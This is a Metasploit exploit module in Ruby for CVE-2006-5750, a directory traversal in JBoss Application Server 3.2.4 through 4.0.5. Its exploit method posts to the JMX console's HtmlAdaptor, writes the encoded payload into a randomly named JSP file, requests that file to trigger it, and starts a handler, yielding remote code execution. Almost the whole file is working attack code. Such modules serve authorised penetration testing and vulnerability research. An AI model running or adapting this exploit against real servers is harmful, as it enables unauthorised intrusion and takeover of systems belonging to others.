##
# $Id: jboss_deploymentfilerepository.rb 9246 2010-05-07 22:28:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'JBoss Java Class DeploymentFileRepository Directory Traversal',
			'Description' => %q{
					This module exploits a directory traversal vulnerability in the DeploymentFileRepository
				class in JBoss Application Server (jbossas) 3.2.4 through 4.0.5. This vulnerability
				allows remote authenticated (and unathenticated) users to read or modify arbitrary files,
				and possibly execute arbitrary code.
			},
			'Author'      => [ 'MC' ],
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision: 9246 $',
			'References'  =>
				[
					[ 'CVE', '2006-5750' ],
					[ 'BID', '21219' ]
				],
			'Privileged'  => false,
			'Platform'    => [ 'linux' ],
			'Targets'     =>
				[
					[ 'Universal',
						{
							'Arch' => ARCH_JAVA,
							'Payload' =>
								{
									'DisableNops' => true,
								},
						}
					],
				],
			'DisclosureDate' => 'Nov 27 2006',
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('SHELL', [ true,  "The system shell to use.", '/bin/sh']),
				OptString.new('URI',   [ true,  "The system shell to use.", '/jmx-console/']),
				OptString.new('PATH',  [ true,  "The URI path of the console.", '../jmx-console.war/'])
			], self.class)
	end

	def exploit

		fname = rand_text_alpha_upper(rand(5) + 1)

		res = send_request_cgi(
			{
				'uri'	=>  '/jmx-console/HtmlAdaptor',
				'method' => 'POST',
				'data'	=>	'action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=5&arg0=' +
						Rex::Text.uri_encode(datastore['PATH']) + '&arg1=' + fname + '&arg2=.jsp&arg3=' +
						Rex::Text.uri_encode(payload.encoded) + '&arg4=True',
			})

		if (res.code == 200)
			print_status("Triggering payload...")
			send_request_raw(
				{
					'uri'   => datastore['URI'] + fname + '.jsp',
					'method' => 'GET',
			 	})
		else
			print_error("Denied...")
		end

		handler
	end

end

